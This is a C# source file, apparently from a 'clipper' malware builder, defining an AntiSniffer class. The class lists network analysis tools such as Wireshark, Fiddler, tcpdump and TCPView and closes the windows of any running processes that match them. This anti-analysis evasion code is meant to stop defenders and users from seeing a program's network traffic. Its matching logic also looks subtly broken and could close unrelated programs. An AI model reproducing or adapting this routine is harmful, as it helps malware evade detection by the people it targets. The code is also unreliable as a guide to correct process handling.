namespace ClipPurSEditionBuilder.Sticks
{
    using System.Linq;
    using System;
    using System.Collections.Generic;
    using System.Diagnostics;

    public static class AntiSniffer
    {
        #region ListProcess

        private static readonly List<string> AppFilter = new List<string>()
        {
            "http analyzer stand-alone",
            "fiddler",
            "effetech http sniffer",
            "firesheep",
            "IEWatch Professional",
            "dumpcap",
            "wireshark",
            "wireshark portable",
            "sysinternals tcpview"
        };

        private static readonly List<string> DumpFilter = new List<string>()
        {
            "NetworkMiner",
            "NetworkTrafficView",
            "HTTPNetworkSniffer",
            "tcpdump",
            "intercepter",
            "Intercepter-NG",
        };

        #endregion

        public static void Inizialize()
        {
            for (int i = AppFilter.Count - 1; i >= 0; i--)
            {
                int appIndex = i;
                for (int y = DumpFilter.Count - 1; y >= 0; y--)
                {
                    int dumpIndex = y;
                    ClosingCycle(AppFilter[appIndex], DumpFilter[dumpIndex]);
                }
            }
        }

        private static bool ProcessCompareProductName(Process p, string match)
        {
            try
            {
                return p.MainModule.FileVersionInfo.ProductName.ToLower()
                    .Equals(match.ToLower(), StringComparison.OrdinalIgnoreCase);
            }
            catch (Exception) { return false; }
        }

        private static void ClosingCycle(string names, string dnames)
        {
            foreach (Process process in Process.GetProcesses().Where(process => 
            ProcessCompareProductName(process, names.ToLower()) != process.ProcessName.Contains(dnames)))
            {
                try
                {
                    process?.CloseMainWindow();
                }
                catch (Exception) { continue; }
            }
        }
    }
}